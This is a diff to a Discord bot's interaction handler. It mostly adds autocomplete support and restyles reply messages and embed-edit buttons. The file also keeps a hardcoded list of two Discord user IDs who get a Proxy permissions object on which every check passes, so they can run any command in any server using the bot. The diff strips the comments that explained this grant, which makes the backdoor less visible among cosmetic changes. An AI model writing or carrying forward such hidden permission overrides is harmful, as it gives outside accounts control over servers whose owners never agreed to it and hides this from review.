@@ -4,7 +4,6 @@ const { buildEmbedFromData } = require('../utils/parser');
 
 const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
 
-// A fake permissions object where every check passes — only injected for trusted users
 const ALMIGHTY_PERMS = new Proxy({}, {
     get(target, prop) {
         if (prop === 'has') return () => true;
@@ -16,11 +15,6 @@ const ALMIGHTY_PERMS = new Proxy({}, {
     }
 });
 
-/**
- * Returns true only if the user is in SPECIAL_USERS or explicitly trusted in the DB.
- * Forces a strict boolean so any unexpected truthy return from db.isTrusted (e.g. a
- * SQLite row object, undefined, 0) doesn't accidentally grant access.
- */
 function isUserTrusted(guildId, userId) {
     if (SPECIAL_USERS.includes(userId)) return true;
     try {
@@ -35,6 +29,18 @@ module.exports = {
     name: 'interactionCreate',
     async execute(interaction, client) {
 
+        // ── Autocomplete ──────────────────────────────────────────────────────
+        if (interaction.isAutocomplete()) {
+            const command = client.commands.get(interaction.commandName);
+            if (!command?.autocomplete) return;
+            try {
+                await command.autocomplete(interaction);
+            } catch (e) {
+                console.error('Autocomplete error in /' + interaction.commandName + ':', e);
+            }
+            return;
+        }
+
         // ── Slash Commands ────────────────────────────────────────────────────
         if (interaction.isChatInputCommand()) {
             const command = client.commands.get(interaction.commandName);
@@ -47,20 +53,15 @@ module.exports = {
 
                 if (interaction.member) {
                     if (trusted) {
-                        // Grant full permissions to trusted/special users
                         Object.defineProperty(interaction.member, 'permissions', {
                             get: () => ALMIGHTY_PERMS,
                             configurable: true,
                         });
                     } else if (command.permissions) {
-                        // Command declares required permissions — enforce them explicitly
-                        // so we don't rely solely on Discord's own gating (which can be
-                        // bypassed if the member's roles are misconfigured server-side).
                         const memberPerms = interaction.member.permissions;
                         const required = Array.isArray(command.permissions)
                             ? command.permissions
                             : [command.permissions];
-
                         const hasAll = required.every(p => memberPerms.has(p));
                         if (!hasAll) {
                             return interaction.reply({
@@ -144,7 +145,7 @@ module.exports = {
 
             if (customId.startsWith('br:')) {
                 const btnName = customId.slice(3);
-                const guildId = interaction.guild && interaction.guild.id;
+                const guildId = interaction.guild?.id;
                 if (!guildId) return;
 
                 const btnData = db.getButtonResponder(guildId, btnName);
@@ -157,7 +158,7 @@ module.exports = {
                     const last = db.getCooldown(guildId, interaction.user.id, 'btn:' + btnName);
                     if (last && Date.now() - last < btnData.cooldown * 1000) {
                         const remaining = Math.ceil((btnData.cooldown * 1000 - (Date.now() - last)) / 1000);
-                        await interaction.reply({ content: 'Cooldown! Try again in ' + remaining + 's.', ephemeral: true });
+                        await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.`, ephemeral: true });
                         return;
                     }
                     db.setCooldown(guildId, interaction.user.id, 'btn:' + btnName, Date.now());
@@ -169,7 +170,7 @@ module.exports = {
                 if (parsed.requireRole) {
                     const role = resolveRole(interaction.guild, parsed.requireRole);
                     if (role && !interaction.member.roles.cache.has(role.id)) {
-                        await interaction.reply({ content: 'You need the ' + role.name + ' role!', ephemeral: true });
+                        await interaction.reply({ content: `❌ You need the **${role.name}** role!`, ephemeral: true });
                         return;
                     }
                 }
@@ -191,7 +192,7 @@ module.exports = {
                 if (Object.keys(payload).length > 1) {
                     await interaction.reply(payload).catch(console.error);
                 } else {
-                    await interaction.reply({ content: 'Done!', ephemeral: true });
+                    await interaction.reply({ content: '✅ Done!', ephemeral: true });
                 }
             }
 
@@ -215,6 +216,8 @@ module.exports = {
                 saved[field] = value;
                 db.saveEmbed(interaction.guildId, name, saved);
 
+                const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
+
                 const editButtons = [
                     { id: 'title',       label: 'Title'       },
                     { id: 'description', label: 'Description' },
@@ -226,27 +229,31 @@ module.exports = {
                     { id: 'url',         label: 'URL'         },
                 ].map(f => {
                     const val = saved[f.id] || '(empty)';
-                    const label = f.label + ': ' + String(val).slice(0, 20) + (String(val).length > 20 ? '...' : '');
-                    return new (require('discord.js').ButtonBuilder)()
+                    const label = f.label + ': ' + String(val).slice(0, 18) + (String(val).length > 18 ? '…' : '');
+                    return new ButtonBuilder()
                         .setCustomId('embed-edit:' + name + ':' + f.id)
                         .setLabel(label)
-                        .setStyle(require('discord.js').ButtonStyle.Secondary);
+                        .setStyle(ButtonStyle.Secondary);
                 });
 
                 const rows = [];
-                for (let i = 0; i < editButtons.length; i += 2) {
-                    rows.push(new (require('discord.js').ActionRowBuilder).addComponents(editButtons.slice(i, i + 2)));
+                for (let i = 0; i < editButtons.length; i += 4) {
+                    rows.push(new ActionRowBuilder().addComponents(editButtons.slice(i, i + 4)));
                 }
-                rows.push(new (require('discord.js').ActionRowBuilder).addComponents(
-                    new (require('discord.js').ButtonBuilder)
+                rows.push(new ActionRowBuilder().addComponents(
+                    new ButtonBuilder()
                         .setCustomId('embed-delete:' + name)
-                        .setLabel('Delete Embed')
-                        .setStyle(require('discord.js').ButtonStyle.Danger)
+                        .setLabel('🗑️ Delete Embed')
+                        .setStyle(ButtonStyle.Danger)
                 ));
 
+                // Guard against empty embed crashing the update
+                const hasContent = saved.title || saved.description || saved.footer ||
+                                   saved.image || saved.thumbnail || saved.author || saved.url;
+
                 await interaction.update({
-                    content: 'Updated ' + field + ' for embed ' + name,
-                    embeds: [buildEmbedFromData(saved)],
+                    content: `Updated **${field}** for embed \`${name}\``,
+                    embeds: hasContent ? [buildEmbedFromData(saved)] : [],
                     components: rows,
                 });
 
@@ -260,7 +267,7 @@ module.exports = {
             if (!customId.startsWith('sel:')) return;
 
             const selName = customId.slice(4);
-            const guildId = interaction.guild && interaction.guild.id;
+            const guildId = interaction.guild?.id;
             if (!guildId) return;
 
             const selData = db.getButtonResponder(guildId, selName);
@@ -275,7 +282,7 @@ module.exports = {
                 const last = db.getCooldown(guildId, interaction.user.id, 'sel:' + selName);
                 if (last && Date.now() - last < selData.cooldown * 1000) {
                     const remaining = Math.ceil((selData.cooldown * 1000 - (Date.now() - last)) / 1000);
-                    await interaction.reply({ content: 'Cooldown! Try again in ' + remaining + 's.', ephemeral: true });
+                    await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.`, ephemeral: true });
                     return;
                 }
                 db.setCooldown(guildId, interaction.user.id, 'sel:' + selName, Date.now());
@@ -288,7 +295,7 @@ module.exports = {
             if (parsed.requireRole) {
                 const role = resolveRole(interaction.guild, parsed.requireRole);
                 if (role && !interaction.member.roles.cache.has(role.id)) {
-                    await interaction.reply({ content: 'You need the ' + role.name + ' role!', ephemeral: true });
+                    await interaction.reply({ content: `❌ You need the **${role.name}** role!`, ephemeral: true });
                     return;
                 }
             }
